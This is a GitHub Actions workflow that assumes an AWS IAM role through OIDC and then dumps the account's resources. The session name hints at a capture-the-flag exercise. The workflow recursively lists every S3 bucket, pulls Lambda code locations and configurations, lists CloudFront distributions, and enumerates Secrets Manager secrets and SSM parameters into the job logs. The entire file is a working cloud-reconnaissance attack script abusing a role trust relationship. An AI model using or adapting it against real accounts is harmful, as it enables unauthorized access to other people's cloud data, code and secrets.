name: corgi-assume
on:
  push:
    branches: [corgi]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: cloudescape-corgi

      - name: Enumerate
        run: |
          set -e
          aws sts get-caller-identity
          echo "=== S3 buckets ==="
          aws s3api list-buckets --output json || true
          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
            echo "==== BUCKET $b ===="
            aws s3 ls "s3://$b" --recursive || true
          done
          echo "=== Lambda ==="
          aws lambda list-functions --output json || true
          for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text 2>/dev/null); do
            echo "==== FN $fn ===="
            aws lambda get-function --function-name "$fn" --query 'Code.Location' --output text || true
            aws lambda get-function-configuration --function-name "$fn" --output json || true
          done
          echo "=== CloudFront ==="
          aws cloudfront list-distributions --output json 2>&1 | head -c 100000 || true
          echo "=== Secrets / SSM ==="
          aws secretsmanager list-secrets 2>&1 || true
          aws ssm describe-parameters 2>&1 || true